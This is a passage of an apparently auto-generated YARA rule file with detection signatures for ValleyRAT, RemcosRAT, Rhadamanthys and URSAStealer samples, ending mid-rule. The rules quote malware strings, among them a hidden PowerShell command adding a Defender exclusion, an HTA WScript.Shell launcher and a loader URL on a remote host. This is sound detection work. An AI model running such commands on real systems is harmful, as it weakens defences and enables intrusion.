      $s13 = "70A47767C535477F2E889C627567C52D477BE735577A7AD17629E8A0E5255776F6864FEAA26DBD8E0776FE95659EE969E4633124F68E4F1C9686C861736246BC" ascii /* score: '11.00'*/
      $s14 = "92D17A6CFF2010D440142E6E4A49BDC5493A4CDDCBC8B1BAABC7C4C5F0FFC1BA7692D8FFD004FD4116F0A8F5E93F132C85C88A159F3587E3BE22CD9D0B73B5AF" ascii /* score: '11.00'*/
      $s15 = "E9977CE60098B196E6821852F01E51774E1D7390BAEA274661ECBEEC9560E83B8C9D8A98783A8BF5869E8CE9214352303AEAAC6EF7268A98B1E2274B4C8A47E1" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule ValleyRAT_signature__83e3c2e38a442145eaa2522b14e0d343_imphash__d7adfc97 {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_83e3c2e38a442145eaa2522b14e0d343(imphash)_d7adfc97.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d7adfc9774a6f8f2e40da98960bbaaefd6851a362ed0953281df63a449c9bff1"
   strings:
      $x1 = "C:\\Users\\Admin\\Downloads\\Test360\\x64\\Release\\Test360.pdb" fullword ascii /* score: '39.00'*/
      $s2 = "wscript.exe \"%s\"" fullword ascii /* score: '23.00'*/
      $s3 = "shortcut.TargetPath = \"%s\"" fullword ascii /* score: '20.00'*/
      $s4 = "69636F6C617354676E6963" ascii /* score: '17.00'*/ /* hex encoded string 'icolasTgnic' */
      $s5 = "%s\\SystemTool.lnk" fullword ascii /* score: '14.00'*/
      $s6 = "Set shortcut = WshShell.CreateShortcut(\"%s\")" fullword ascii /* score: '12.00'*/
      $s7 = "create_shortcut.vbs" fullword ascii /* score: '11.00'*/
      $s8 = "AB8BD3710C54C7F5B553C539096E24CB8FEBCD1B463F160CB0ADA2DCD9286CB7FB0B984E678D6C1ED350B23044897ED636999508794FD2B76483F2F197B6D3F9" ascii /* score: '11.00'*/
      $s9 = "5C6EC7D2F1EAD85D27E4746463D38BC21247D7AE95917DBAEC601257C0D5263E2090F16FB28AEA7E96BC334A4CE55193792BA216427A5BDCC48898DCC4A5D6E7" ascii /* score: '11.00'*/
      $s10 = "75958810CFEC7AC23EC21F19A1C8672E3CDBF1FD690186FC0B03523AC4DF7B08F673B355D7B4BA6B19E42085C0DF68748E5D5DB0837A2CE6F80DCDDD8BB3A069" ascii /* score: '11.00'*/
      $s11 = "F06EB4166D291FB720FF9B9D0FDEA43D02EFEA4DC0FBA192F0A08771A66D0646AAE2DC25061F1B3AA6776D32433B23A58118F3D63EF303FDA1F4D109FFF06241" ascii /* score: '11.00'*/
      $s12 = "BA1EDC527B4CBAA240AF8B4918721CE3BE7394F41136E624484D670C4D04572B3FC446BFA8CC53BBF25917D3099C1315BD1C455EDA890102B7E45F229ED22960" ascii /* score: '11.00'*/
      $s13 = "204BD71044BB36E32DFCCBAEE49D7A38F659ED49330F8E8AD8CE3E54EC2F1DE2B517607E35199EB653A3F13730D10CB9BD46B4EAD31A4486998C874B72B14A18" ascii /* score: '11.00'*/
      $s14 = "F1789C70C203004DE0088283F6FFE252A5BE0ABF453888B7842FEAD2525C4F62F17DDFC71A04CDFD4CE4A116A970DBF472F7CB9168802357EDFB75FA1AADB327" ascii /* score: '11.00'*/
      $s15 = "384BF18A576B036616193FADE389221AFEB020C788F1D8A82405DD166A07A1B3733764275962758467FC7D5581E2B24F76B140D63590089235DD7512B4FE7F74" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule ValleyRAT_signature__c35bbdf2a1165e98d0e46b0e3882deeb_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_c35bbdf2a1165e98d0e46b0e3882deeb(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "567760cca4e5b0590d7ed5c7ca61f75add6ffab199b351ce93e7429df988d046"
   strings:
      $x1 = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"if ((Get-MpPreference).ExclusionPath -notcontains 'C:\\\\Users" ascii /* score: '56.00'*/
      $x2 = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"if ((Get-MpPreference).ExclusionPath -notcontains 'C:\\\\Users" ascii /* score: '53.00'*/
      $x3 = "C:\\Users\\Public\\Documents\\WindowsData\\NVIDIA.exe" fullword ascii /* score: '38.00'*/
      $x4 = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword ascii /* score: '31.00'*/
      $s5 = "ublic\\\\Documents') { Add-MpPreference -ExclusionPath 'C:\\\\Users\\\\Public\\\\Documents' }\"" fullword ascii /* score: '28.00'*/
      $s6 = "C:\\\\Users\\\\Public\\\\Documents" fullword ascii /* score: '27.00'*/
      $s7 = "log.dll" fullword ascii /* score: '25.00'*/
      $s8 = "C:\\Cndom6.sys" fullword ascii /* score: '24.00'*/
      $s9 = "C:\\XiaoH.sys" fullword ascii /* score: '24.00'*/
      $s10 = "-NoProfile -WindowStyle Hidden -Command \"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;(Get-MpPreference).ExclusionPat" ascii /* score: '23.00'*/
      $s11 = "-NoProfile -WindowStyle Hidden -Command \"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;(Get-MpPreference).ExclusionPat" ascii /* score: '23.00'*/
      $s12 = "NVIDIA.exe" fullword ascii /* score: '22.00'*/
      $s13 = "tracerpt.exe" fullword ascii /* score: '22.00'*/
      $s14 = "NtHandleCallback.exe" fullword ascii /* score: '18.00'*/
      $s15 = "NtOpenProcess" fullword wide /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__6e7f9a29f2c85394521a08b9f31f6275_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_6e7f9a29f2c85394521a08b9f31f6275(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "377a6d1d3dc2bfdaea6e81bc61d3183fb7a7e306569f25e486fcde731c14ef32"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.06</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "jjicxxw" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__b34f154ec913d2d2c435cbd644e91687_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b34f154ec913d2d2c435cbd644e91687(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bbd7cc3340148f7bb3f3b8da082367550494471104d4f9fdaa5bee65aae637ac"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "unmediumistic sandes.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "yEXeCz9" fullword ascii /* score: '8.00'*/
      $s5 = "gonyalgia" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule ValleyRAT_signature__71f9847d471117d3d5852a01b4f24cb3_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_71f9847d471117d3d5852a01b4f24cb3(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1107160996aad02e3d44572030599713712db1e7538a346d5bd885f1ff88fdaa"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.0.0.0\" processorArch" ascii /* score: '48.00'*/
      $s1 = "cy><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorA" ascii /* score: '26.00'*/
      $s2 = "rn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"" ascii /* score: '26.00'*/
      $s3 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.0.0.0\" processorArch" ascii /* score: '22.00'*/
      $s4 = "WinMergeU.EXE" fullword wide /* score: '22.00'*/
      $s5 = "questedExecutionLevel></requestedPrivileges></security></trustInfo><application xmlns=\"urn:schemas-microsoft-com:asm.v3\"><wind" ascii /* score: '18.00'*/
      $s6 = "FEDCBA?" fullword ascii /* reversed goodware string '?ABCDEF' */ /* score: '14.00'*/
      $s7 = "2.16.46.0" fullword wide /* score: '14.00'*/ /* hex encoded string '!d`' */
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and 5 of them
}

rule RemcosRAT_signature__4fccf079 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_4fccf079.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4fccf079d2e2942caad3338ada2aedf4290d380df931ae188e74693b86535da9"
   strings:
      $x1 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null" ascii /* score: '34.00'*/
      $x2 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null" ascii /* score: '34.00'*/
      $s3 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_Processor\", null, 48));" fullword ascii /* score: '27.00'*/
      $s4 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_Process\", null, 48));" fullword ascii /* score: '27.00'*/
      $s5 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_NetworkLoginProfile\", null, 48" ascii /* score: '27.00'*/
      $s6 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", nu" ascii /* score: '27.00'*/
      $s7 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_NetworkLoginProfile\", null, 48" ascii /* score: '27.00'*/
      $s8 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_PrinterDriverDll\", null, 48));" ascii /* score: '27.00'*/
      $s9 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", nu" ascii /* score: '27.00'*/
      $s10 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_TemperatureProbe\", null, 48));" ascii /* score: '26.00'*/
      $s11 = "var wheal = gennelmen.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s12 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_HeatPipe\", null, 48));" fullword ascii /* score: '25.00'*/
      $s13 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null" ascii /* score: '25.00'*/
      $s14 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null" ascii /* score: '25.00'*/
      $s15 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_OperatingSystem\", null, 48));" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__8d61a111 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_8d61a111.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8d61a111c690ba0dead25b1a2e06fcf7c374e3a610b1ae82e4b385ca52d44014"
   strings:
      $x1 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null" ascii /* score: '34.00'*/
      $x2 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null" ascii /* score: '34.00'*/
      $x3 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_PrinterDriverDll\", null, 48));" ascii /* score: '32.00'*/
      $x4 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_TemperatureProbe\", null, 48));" ascii /* score: '31.00'*/
      $s5 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null" ascii /* score: '30.00'*/
      $s6 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null" ascii /* score: '30.00'*/
      $s7 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_HeatPipe\", null, 48));" fullword ascii /* score: '30.00'*/
      $s8 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_OperatingSystem\", null, 48));" fullword ascii /* score: '29.00'*/
      $s9 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_DeviceMemoryAddress\", null, 48" ascii /* score: '27.00'*/
      $s10 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_PrinterConfiguration\", null, 4" ascii /* score: '27.00'*/
      $s11 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_SerialPort\", null, 48));" fullword ascii /* score: '27.00'*/
      $s12 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_Process\", null, 48));" fullword ascii /* score: '27.00'*/
      $s13 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", nu" ascii /* score: '27.00'*/
      $s14 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_NetworkAdapterConfiguration\", " ascii /* score: '27.00'*/
      $s15 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_NetworkAdapterConfiguration\", " ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 700KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__9b74c647 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_9b74c647.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9b74c6472957df96c56ddef5fbc4996f071ce281109a4bdace0ccc1162845648"
   strings:
      $x1 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null, 48));" ascii /* score: '34.00'*/
      $s2 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_Process\", null, 48));" fullword ascii /* score: '27.00'*/
      $s3 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_Processor\", null, 48));" fullword ascii /* score: '27.00'*/
      $s4 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_PrinterDriverDll\", null, 48));" fullword ascii /* score: '27.00'*/
      $s5 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_NetworkLoginProfile\", null, 48));" fullword ascii /* score: '27.00'*/
      $s6 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", null, 48)" ascii /* score: '27.00'*/
      $s7 = "var humbleness = retroact.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s8 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_TemperatureProbe\", null, 48));" fullword ascii /* score: '26.00'*/
      $s9 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_HeatPipe\", null, 48));" fullword ascii /* score: '25.00'*/
      $s10 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null, 48));" ascii /* score: '25.00'*/
      $s11 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_OperatingSystem\", null, 48));" fullword ascii /* score: '24.00'*/
      $s12 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_NTLogEvent\", null, 48));" fullword ascii /* score: '24.00'*/
      $s13 = "var unalike = retroact.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s14 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_POTSModemToSerialPort\", null, 48));" fullword ascii /* score: '22.00'*/
      $s15 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_PrinterDriver\", null, 48));" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__809ecfe0 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_809ecfe0.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "809ecfe0d5639158fd1626f4bf2c4c3629a64e012f95f7a08d1b6b0c8a65508e"
   strings:
      $s1 = "function Ichimokuren(devModeProperties, scriptContext, printTicket) {" fullword ascii /* score: '13.00'*/
      $s2 = "dithiophosphate.Run(grave, 0, false);" fullword ascii /* score: '13.00'*/
      $s3 = "var dithiophosphate = new ActiveXObject(\"WScript.Shell\");" fullword ascii /* score: '12.00'*/
      $s4 = "Kn7F5JzugnkhCw8pKL7F5JzugnkhCw8pKC7F5JzugnkhCw8pKc7F5JzugnkhCw8pKn7F5JzugnkhCw8pKL7F5JzugnkhCw8pKC7F5JzugnkhCw8pKd7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s5 = "Kg7F5JzugnkhCw8pKP7F5JzugnkhCw8pKS7F5JzugnkhCw8pKA7F5JzugnkhCw8pKo7F5JzugnkhCw8pKK7F5JzugnkhCw8pKE7F5JzugnkhCw8pK57F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s6 = "Kl7F5JzugnkhCw8pKZ7F5JzugnkhCw8pKn7F5JzugnkhCw8pKk7F5JzugnkhCw8pKu7F5JzugnkhCw8pKY7F5JzugnkhCw8pKX7F5JzugnkhCw8pKB7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s7 = "K57F5JzugnkhCw8pKI7F5JzugnkhCw8pKD7F5JzugnkhCw8pK07F5JzugnkhCw8pKg7F5JzugnkhCw8pKW7F5JzugnkhCw8pK17F5JzugnkhCw8pKJ7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s8 = "Kj7F5JzugnkhCw8pKd7F5JzugnkhCw8pKF7F5JzugnkhCw8pKt7F5JzugnkhCw8pKd7F5JzugnkhCw8pKX7F5JzugnkhCw8pKU7F5JzugnkhCw8pKA7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s9 = "K67F5JzugnkhCw8pKX7F5JzugnkhCw8pKF7F5JzugnkhCw8pKV7F5JzugnkhCw8pKz7F5JzugnkhCw8pKZ7F5JzugnkhCw8pKX7F5JzugnkhCw8pKJ7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s10 = "Ku7F5JzugnkhCw8pKd7F5JzugnkhCw8pKm7F5JzugnkhCw8pK97F5JzugnkhCw8pKr7F5JzugnkhCw8pKZ7F5JzugnkhCw8pKS7F5JzugnkhCw8pKg7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s11 = "Kl7F5JzugnkhCw8pKd7F5JzugnkhCw8pKy7F5JzugnkhCw8pK17F5JzugnkhCw8pKP7F5JzugnkhCw8pKY7F5JzugnkhCw8pKm7F5JzugnkhCw8pKp7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s12 = "K37F5JzugnkhCw8pKJ7F5JzugnkhCw8pKy7F5JzugnkhCw8pKw7F5JzugnkhCw8pKn7F5JzugnkhCw8pKa7F5JzugnkhCw8pKH7F5JzugnkhCw8pKR7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s13 = "Kh7F5JzugnkhCw8pKc7F5JzugnkhCw8pK27F5JzugnkhCw8pKU7F5JzugnkhCw8pK27F5JzugnkhCw8pKN7F5JzugnkhCw8pKF7F5JzugnkhCw8pKN7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s14 = "Kh7F5JzugnkhCw8pKc7F5JzugnkhCw8pKn7F5JzugnkhCw8pKR7F5JzugnkhCw8pK17F5JzugnkhCw8pKc7F5JzugnkhCw8pKF7F5JzugnkhCw8pK97F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s15 = "Kr7F5JzugnkhCw8pKa7F5JzugnkhCw8pK37F5JzugnkhCw8pKk7F5JzugnkhCw8pKn7F5JzugnkhCw8pKL7F5JzugnkhCw8pKC7F5JzugnkhCw8pKc7F5JzugnkhCw8p" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 70KB and
      8 of them
}

rule Rhadamanthys_signature_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature).html"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bd264886e1ef3600ce3ba83451828929addead1195beed5027f6b4cc1645c436"
   strings:
      $x1 = "</script>   <meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\" /> <meta name=\"viewport\" content=\"width=de" ascii /* score: '42.00'*/
      $x2 = "                                        <div class=\"mu-class\"> <div class=\"item-title-position  \"> <div class=\"new-prop-ima" ascii /* score: '35.00'*/
      $s3 = "</div> </div> </div>                                                                      <div class=\"sidebar-rew-reviews sideb" ascii /* score: '27.00'*/
      $s4 = " <div class=\"comments-list-container\" > <h3 class=\"title\"> <span class=\"count\" id=\"comments-count\">1</span> Comments </h" ascii /* score: '26.00'*/
      $s5 = "<noscript><iframe src=\"https://www.googletagmanager.com/ns.html?id=GTM-NT362VP\"" fullword ascii /* score: '26.00'*/
      $s6 = "</svg> </a> <div> <a role=\"button\" tabindex=\"0\" class=\"mob-search btn-header-search\" id=\"btn-header-search-tablet\"> <svg" ascii /* score: '24.00'*/
      $s7 = "4442/comtinybuildgameshelloneighbor-id4442.png\" alt=\"Hello Neighbor\"> </a> </li>  <li> <a href=\"https://playingclub.org/amon" ascii /* score: '23.00'*/
      $s8 = "<!-- End Google Tag Manager (noscript) -->" fullword ascii /* score: '23.00'*/
      $s9 = "ink rel=\"preload\" href=\"https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap\" as=\"style\" onlo" ascii /* score: '22.00'*/
      $s10 = "lass=\"\"> <!-- /22849912130/playingclub.org/playingclub.org_d_unit_sidebar_336 -->" fullword ascii /* score: '20.00'*/
      $s11 = "bg=\"/images/thumb/400x400xc/uploads/post/d49c4d01-0353-40c8-82c0-5f2d3e972f26.jpg\"></span> <span class=\"blog-items-content\">" ascii /* score: '20.00'*/
      $s12 = "c/uploads/post/27bd3b6f-b070-43b3-b17c-ebc44d6d461c.jpg\"></span> <span class=\"blog-items-content\"> <span class=\"blog-items-t" ascii /* score: '20.00'*/
      $s13 = "-links list-inline\"> <li> <a onclick=\"window.open('https://www.facebook.com/sharer/sharer.php?u=http://playingclub.org/minecra" ascii /* score: '20.00'*/
      $s14 = "', 'newwindow', 'width=500,height=450'); return false;\" href=\"https://www.facebook.com/sharer/sharer.php?u=http://playingclub." ascii /* score: '20.00'*/
      $s15 = "                <div class=\"top-apps_block card2 full-width desktop\"> <div class=\"big-container\"> <ul>  <li> <a href=\"https" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule URSAStealer_signature_ {
   meta:
      description = "_subset_batch - file URSAStealer(signature).hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e80c28da721de99e54478d1b40477f66d13b2313b3a7d4cc40b19c95f70f9741"
   strings:
      $s1 = "        RPfkx31.src = U0y51+ 'tt' + DpwObgL52 + ':/' + '/129.90.74.97.host.secureserver.net/DpwObgL52/DpwObgL52mde2/HRaHaIW943.'" ascii /* score: '16.00'*/
      $s2 = "        RPfkx31.src = U0y51+ 'tt' + DpwObgL52 + ':/' + '/129.90.74.97.host.secureserver.net/DpwObgL52/DpwObgL52mde2/HRaHaIW943.'" ascii /* score: '16.00'*/
      $s3 = "The rainy season runs from late August through November, and the dry season runs from November through April. The hurricane seas" ascii /* score: '13.00'*/
      $s4 = "daytime temperatures around 1 to 2 " fullword ascii /* score: '11.00'*/
      $s5 = "n current continually bringing warm water from further south, the sea temperature is always very warm, with lows of 79 " fullword ascii /* score: '11.00'*/
      $s6 = "ppen Aw), with little temperature difference between months, but pronounced rainy and dry seasons. The city is hot year-round, a" ascii /* score: '11.00'*/
      $s7 = "nd moderated by onshore trade winds, with an annual mean temperature of 27.1 " fullword ascii /* score: '11.00'*/
      $s8 = "ppen Aw), with little temperature difference between months, but pronounced rainy and dry seasons. The city is hot year-round, a" ascii /* score: '11.00'*/
      $s9 = "n Peninsula, sea breezes restrict high temperatures from reaching 36 " fullword ascii /* score: '11.00'*/
      $s10 = "led to provide public services for the constant influx of people, as well as limiting squatters and irregular developments, whic" ascii /* score: '10.00'*/
      $s11 = "Juarez to the north, continuing along Bonampak and south toward the airport along Boulevard Donaldo Colosio. One development abu" ascii /* score: '9.00'*/
      $s12 = "n's mainland or downtown area has diverged from the original plan; development is scattered around the city. The remaining undev" ascii /* score: '9.00'*/
      $s13 = "Etymology and coat of arms" fullword ascii /* score: '9.00'*/
      $s14 = "n and other Mexican states. A growing number are from the rest of the Americas and Europe. The municipal authorities have strugg" ascii /* score: '9.00'*/
      $s15 = "U0y51 = 'S' + U0y51 + DpwObgL52;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 30KB and
      8 of them
}

rule RemcosRAT_signature__573bb7b41bc641bd95c0f5eec13c233b_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_573bb7b41bc641bd95c0f5eec13c233b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0ad47def129f96acbe890abe8e04dcf099c14a2acf5e1137c756c6239324bc03"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.11</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "~nsu%X.tmp" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__573bb7b41bc641bd95c0f5eec13c233b_imphash__617e3044 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_573bb7b41bc641bd95c0f5eec13c233b(imphash)_617e3044.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "617e304402393e6229e7295054b276aa8d305f015ad03c7013582bb162598f5a"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.11</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "~nsu%X.tmp" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__b34f154ec913d2d2c435cbd644e91687_imphash__5135308d {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_5135308d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5135308dec04eaf8d683adb9fdff45cbfceefdec51ee054a22fad2e771e1c65b"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s3 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s4 = "nstall System v3.02.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s5 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__cc8a485e {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_cc8a485e.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cc8a485e552f058acef91ffaa910d757b41fe325c4974770953ea3066e3b6284"
   strings:
